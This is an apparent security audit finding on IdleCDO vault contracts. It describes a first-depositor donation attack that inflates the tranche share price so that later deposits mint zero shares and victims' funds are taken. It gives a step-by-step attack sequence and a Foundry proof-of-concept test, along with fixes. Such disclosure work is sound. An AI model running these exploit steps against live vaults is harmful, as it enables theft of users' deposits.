### Title
First-depositor share inflation via direct token donation causes rounding-to-zero mints, permanently locking victim deposits - (File: contracts/IdleCDO.sol)

### Summary
The external report describes a division-rounding-to-zero bug where depositors receive 0 shares while their underlying is taken, locking funds. The strongest analog in this repo is in `IdleCDO._deposit` / `_mintSharesAtCurrPrice`: there is no minimum-share or dead-share guard, shares are minted with `_amount * ONE_TRANCHE_TOKEN / _tranchePrice(_tranche)`, and NAV is credited even when `_minted == 0`. A first depositor can donate underlying directly to the CDO to inflate `virtualPrice`, causing a subsequent depositor to be minted 0 tranche tokens while their full deposit is absorbed into NAV. The victim can never withdraw (withdrawal requires burning tranche tokens), and the attacker redeems the NAV including the victim's deposit.

### Finding Description
In `contracts/IdleCDO.sol`, `_deposit` pulls the user's underlyings and mints shares based on the current tranche price:

```solidity
// contracts/IdleCDO.sol:250-253
uint256 _preBal = _contractTokenBalance(_token);
_transferUnderlyingsFrom(msg.sender, address(this), _amount);
_minted = _mintSharesAtCurrPrice(_contractTokenBalance(_token) - _preBal, msg.sender, _tranche);
```

```solidity
// contracts/IdleCDO.sol:437-456
function _mintSharesAtCurrPrice(uint256 _amount, address _to, address _tranche) internal virtual returns (uint256 _minted) {
  _minted = _amount * ONE_TRANCHE_TOKEN / _tranchePrice(_tranche);
  _mintShares(_tranche, _to, _minted, _amount);
}

function _mintShares(address _tranche, address _to, uint256 _shares, uint256 _underlyings) internal {
  IdleCDOTranche(_tranche).mint(_to, _shares);
  if (_tranche == AATranche) { lastNAVAA += _underlyings; } else { lastNAVBB += _underlyings; }
}
```

Key facts:

- `priceAA`/`priceBB` are initialized to `oneToken` (`10**decimals` of the underlying) — `contracts/IdleCDO.sol:78-81`.
- `_virtualPriceAux` computes `virtualPrice = trancheNAV * ONE_TRANCHE_TOKEN / trancheSupply` — `contracts/IdleCDO.sol:429`.
- `getContractValue()` (NAV) includes the raw `token` balance sitting in the CDO, since unlent funds are held in the contract until `harvest` — this is exactly why `_deposit` measures `_contractTokenBalance(_token) - _preBal` and why `unlentPerc` exists. A direct `transfer` of `token` to the CDO therefore inflates NAV once `_updateAccounting()` runs.

Attack sequence (18-decimal underlying e.g. DAI, any non-epoch IdleCDO deployment where tranche supply is 0 or attacker-dominated — credit-vault KYC does not apply to `depositAA`/`depositBB` on the standard `IdleCDO`):

1. Attacker calls `depositAA(1)` as the first AA depositor. Tranche supply = 1 share, `priceAA = 1e18`, `lastNAVAA = 1`.
2. Attacker transfers `X` underlying directly to the CDO contract (donation).
3. Victim calls `depositAA(D)` with `D <= X`. `_deposit` → `_updateAccounting()` → `_virtualPriceAux` sets `priceAA ≈ (1 + X) * 1e18 / 1`. Then `_minted = D * 1e18 / priceAA = D / (1 + X) = 0`. `IdleCDOTranche.mint(victim, 0)` succeeds and `lastNAVAA += D`.
4. Victim holds 0 AA tranche tokens, so `withdrawAA`/`withdrawBB` (which burns tranche tokens to redeem underlyings, `contracts/IdleCDO.sol:477+`) can never return their funds — identical impact to the external report's locked-collateral scenario.
5. Attacker calls `withdrawAA(1)` and redeems essentially all NAV (`1 + X + D`, less performance fees on the "gain"), stealing the victim's deposit.

The same logic applies to `IdleCDOCreditVault._deposit` (`contracts/IdleCDOCreditVault.sol:191-208`, `_mintSharesAtCurrPrice` at `:344-348`) and `IdleCDOAmphorVariant` (`contracts/IdleCDOAmphorVariant.sol:42-58`, which even adds `lastNAVAA += _amount` unconditionally after minting). None of the guards block it: `_checkSameBlock`/`_updateCallerBlock` only prevents same-block deposit→withdraw for the *same* caller; `_checkDefault` checks strategy price decreases, not NAV inflation; `_guarded` only enforces the TVL limit; there is no `_minted == 0` revert and no dead-share bootstrap. The only analogous rounding-to-zero handling in the codebase is in `IdleCDOEpochQueue.processPrefundedDeposits` (`contracts/IdleCDOEpochQueue.sol:268-270`), which acknowledges and tolerates 0-share mints for prefunded deposits — that acknowledgment is for a different flow and does not mitigate this deposit path.

Note on feasibility: the economics work because tranche tokens are always 18 decimals while `virtualPrice` scales with `oneToken`. For an 18-decimal underlying, a donation of `X` causes all victim deposits `D < X` to mint 0 shares — the classic inflation-attack payoff. For low-decimal underlyings (e.g. USDC, `oneToken = 1e6`), the required donation is ~1e12× the victim's deposit, which is not economically viable; the bug is therefore exploitable in practice for 18-decimal (or high-decimal) underlyings and remains a dust-loss rounding issue otherwise.

### Impact Explanation
Direct theft plus permanent freezing of user funds: the victim's full deposit is absorbed into `lastNAVAA`/`lastNAVBB`, they receive 0 claim tokens, and the first depositor redeems the inflated NAV. Loss is quantified as `D` for any victim deposit `D < X` (attacker's donation), bounded only by the first depositor winning the race on a fresh vault deployment or a tranche class with zero supply.

### Likelihood Explanation
Requires the attacker to be the first (or dominant) depositor of a tranche class and to risk a donation roughly equal to the targeted deposit — standard first-depositor inflation conditions. No privileged involvement is needed, no epoch timing is required, and there is no minimum-liquidity/dead-share mitigation or `_minted == 0` check anywhere in the deposit path. If the vault has a donation-skim mechanism not found in this index, it would need to be verified, but nothing in `_deposit`/`_updateAccounting` isolates direct transfers before NAV is computed.

### Recommendation
- Revert on zero mints: `require(_minted > 0)` in `_mintSharesAtCurrPrice` (or in `_deposit`), so a victim's transaction fails rather than silently donating to NAV.
- Apply standard dead-share/first-deposit mitigation: mint a small amount of shares to `address(0)` (or to the CDO) on the first deposit, or initialize the vault with a minimum liquidity deposit at guarded-launch time.
- If donation isolation is intended, ensure `getContractValue` excludes unsolicited `token` transfers (e.g., track internal NAV rather than raw balance), which also hardens `_deposit`'s balance-delta accounting.
- Apply the same fix in `IdleCDOCreditVault._mintSharesAtCurrPrice`, `IdleCDOAmphorVariant`, `IdleCDOLeveregedEulerVariant` and other variant overrides that replicate this mint path.

### Proof of Concept
Foundry test against a mainnet-forked IdleCDO deployment path (DAI-based, 18-decimal underlying):

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IdleCDO} from "../contracts/IdleCDO.sol";
import {IdleCDOTranche} from "../contracts/IdleCDOTranche.sol";

contract InflationLockPoC is Test {
    // fork mainnet, deploy a fresh IdleCDO with an 18-decimals `token`
    IdleCDO cdo;
    IERC20 dai;
    IdleCDOTranche aaTranche;

    address attacker = makeAddr("attacker");
    address victim   = makeAddr("victim");

    function test_zeroShareMint_locksVictimFunds() public {
        uint256 X = 1_000 ether; // donation
        uint256 D = 999 ether;   // victim deposit < X

        // 1) attacker first deposit of 1 wei -> ~1 AA share
        deal(address(dai), attacker, X + 1);
        vm.startPrank(attacker);
        dai.approve(address(cdo), 1);
        cdo.depositAA(1);

        // 2) donation inflates virtualPrice
        dai.transfer(address(cdo), X);
        vm.stopPrank();

        // 3) victim deposit mints 0 shares, NAV absorbs full amount
        deal(address(dai), victim, D);
        vm.startPrank(victim);
        dai.approve(address(cdo), D);
        uint256 minted = cdo.depositAA(D);
        assertEq(minted, 0);
        assertEq(aaTranche.balanceOf(victim), 0);
        // victim's DAI is gone and cannot be withdrawn
        vm.expectRevert(); // insufficient tranche balance / nothing to burn
        cdo.withdrawAA(1);
        vm.stopPrank();

        // 4) attacker redeems nearly all NAV (X + 1 + D minus fees)
        vm.prank(attacker);
        uint256 redeemed = cdo.withdrawAA(aaTranche.balanceOf(attacker));
        assertGt(redeemed, X + D * 9 / 10); // attacker recovers donation + most of victim's deposit
    }
}
```

Caveat: I was unable to fully verify whether `getContractValue` or a separate skim routine already isolates unsolicited `token` donations in this index; if such isolation exists and is invoked inside `_updateAccounting`, the donation step would instead need to route through the strategy's `strategyToken` balance (same mechanism — inflating NAV by sending value the CDO accounts for). The zero-mint/locked-funds primitive in `_mintSharesAtCurrPrice` is confirmed by direct reading of `contracts/IdleCDO.sol:234-264, 391-456`.